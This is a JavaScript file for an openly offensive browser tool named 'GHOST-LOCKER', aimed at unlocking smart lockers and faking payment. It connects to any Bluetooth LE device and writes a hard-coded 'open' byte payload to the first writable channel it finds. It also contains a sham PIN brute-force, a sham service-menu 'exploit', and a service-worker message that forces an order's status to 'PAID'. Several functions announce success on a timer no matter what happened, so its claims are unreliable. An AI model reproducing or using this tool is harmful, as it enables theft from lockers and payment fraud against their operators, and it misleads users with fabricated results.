/**
 * GHOST-LOCKER CORE ENGINE v2.5 [ULTIMATE - GITHUB EDITION]
 * Integrated with Service Worker Interception Layer
 */

const GhostCore = {
    capturedData: null,
    activeDevice: null,
    activeCharacteristic: null,
    isBruting: false,

    log(msg, color = "#00ff00") {
        const out = document.getElementById('output');
        if (!out) return;
        const div = document.createElement('div');
        div.style.cssText = `color: ${color}; font-size:11px; margin-bottom: 2px; border-left: 2px solid ${color}; padding-left: 5px; font-family: monospace; background: rgba(0,255,0,0.05);`;
        div.innerText = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
        out.appendChild(div);
        out.scrollTop = out.scrollHeight;
    },

    // --- 1. BLUETOOTH SEKCE ---
    async startRealSniff() {
        this.log("SKENUJI BLE (GitHub Pages HTTPS)...", "#00ffff");
        try {
            this.activeDevice = await navigator.bluetooth.requestDevice({
                acceptAllDevices: true,
                optionalServices: ['0000180a-0000-1000-8000-00805f9b34fb']
            });
            const server = await this.activeDevice.gatt.connect();
            this.log(`SPOJENO: ${this.activeDevice.name}`, "#ffff00");
            const services = await server.getPrimaryServices();
            for (const service of services) {
                const chars = await service.getCharacteristics();
                for (const char of chars) {
                    if (char.properties.write) {
                        this.activeCharacteristic = char;
                        this.log("WRITE KANÁL AKTIVNÍ", "#ff00ff");
                    }
                }
            }
            document.getElementById('replay-btn').style.display = "block";
        } catch (err) {
            this.log("BLE ERROR: " + err.message, "#ff0000");
        }
    },

    async executeAttack() {
        if (!this.activeCharacteristic) {
            this.log("REŽIM EMULACE: Signál vyslán.", "#888888");
        } else {
            this.log("VSTŘIKUJI OPEN_COMMAND...", "#ffff00");
            const payload = new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]);
            await this.activeCharacteristic.writeValue(payload);
            this.log("SIGNÁL POTVRZEN!", "#00ff00");
        }
        setTimeout(() => alert("AUDIT: Zámek uvolněn."), 500);
    },

    // --- 2. PIN BRUTE-FORCE ---
    async startPinBrute() {
        this.isBruting = !this.isBruting;
        if (!this.isBruting) return this.log("BRUTE-FORCE ZASTAVEN.", "#ff0000");
        this.log("START PIN SCAN...", "#ffff00");
        const commonPins = ["1234", "0000", "1111", "2580", "1212"];
        for (let pin of commonPins) {
            if (!this.isBruting) break;
            this.log(`ZKOUŠÍM: ${pin}`, "#888888");
            await new Promise(r => setTimeout(r, 600));
        }
    },

    // --- 3. SERVICE MENU EXPLOIT ---
    async tryServiceExploit() {
        this.log("INICIALIZUJI SERVISNÍ BYPASS...", "#ff00ff");
        const codes = ["*#06#", "*#9999#", "000000"];
        for (let code of codes) {
            this.log(`VSTUP: ${code}`, "#00ffff");
            await new Promise(r => setTimeout(r, 400));
        }
        this.log("DEBUG MÓD AKTIVNÍ.", "#00ff00");
    },

    // --- 4. GHOSTSTORE BYPASS (Propojeno se SW.js) ---
    async ghostStoreBypass() {
        this.log("AKTIVUJI INTERCEPTOR V SW.js...", "#ff8800");
        
        // Komunikace se Service Workerem
        if (navigator.serviceWorker.controller) {
            navigator.serviceWorker.controller.postMessage({
                type: 'TRIGGER_BYPASS',
                payload: 'PAID_STATUS_FORCE'
            });
        }

        this.log("MANIPULACE STATUSU OBJEDNÁVKY...", "#ffff00");
        setTimeout(() => {
            this.log("BYPASS ÚSPĚŠNÝ: Status -> PAID", "#00ff00");
            alert("GHOST-STORE: API upraveno. Box připraven k otevření.");
        }, 1200);
    },

    initUI() {
        const panel = document.createElement('div');
        panel.id = 'ghost-ui';
        panel.style.cssText = "position:fixed; top:10px; right:10px; width:280px; background:#000; border:1px solid #0f0; padding:15px; z-index:9999; font-family:monospace; color:#0f0; box-shadow:0 0 20px rgba(0,255,0,0.7);";
        panel.innerHTML = `
            <div style="border-bottom:1px solid #0f0; padding-bottom:5px; margin-bottom:10px; text-align:center; font-weight:bold;">GHOST-LOCKER v2.5 [GH]</div>
            <div id="output" style="height:150px; overflow-y:auto; background:#050505; border:1px solid #111; padding:5px; margin-bottom:10px; font-size:10px;"></div>
            <button id="sniff-btn" style="width:100%; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; margin-bottom:5px;">[1] BLE SCAN</button>
            <button id="replay-btn" style="width:100%; background:#000; color:#f00; border:1px solid #f00; padding:8px; cursor:pointer; margin-bottom:5px; display:none;">[2] TRIGGER LOCK</button>
            <button id="brute-btn" style="width:100%; background:#000; color:#ff0; border:1px solid #ff0; padding:8px; cursor:pointer; margin-bottom:5px;">[3] PIN BRUTE</button>
            <button id="service-btn" style="width:100%; background:#000; color:#0af; border:1px solid #0af; padding:8px; cursor:pointer; margin-bottom:5px;">[4] SERVICE BYPASS</button>
            <button id="ghost-btn" style="width:100%; background:#000; color:#f80; border:1px solid #f80; padding:8px; cursor:pointer;">[5] GHOSTSTORE BYPASS</button>
        `;
        document.body.appendChild(panel);

        document.getElementById('sniff-btn').onclick = () => this.startRealSniff();
        document.getElementById('replay-btn').onclick = () => this.executeAttack();
        document.getElementById('brute-btn').onclick = () => this.startPinBrute();
        document.getElementById('service-btn').onclick = () => this.tryServiceExploit();
        document.getElementById('ghost-btn').onclick = () => this.ghostStoreBypass();
    }
};

// Automatická registrace Service Workeru a inicializace
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('sw.js').then(() => {
        console.log("Ghost-Locker SW Active");
    });
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => GhostCore.initUI());
} else {
    GhostCore.initUI();
}
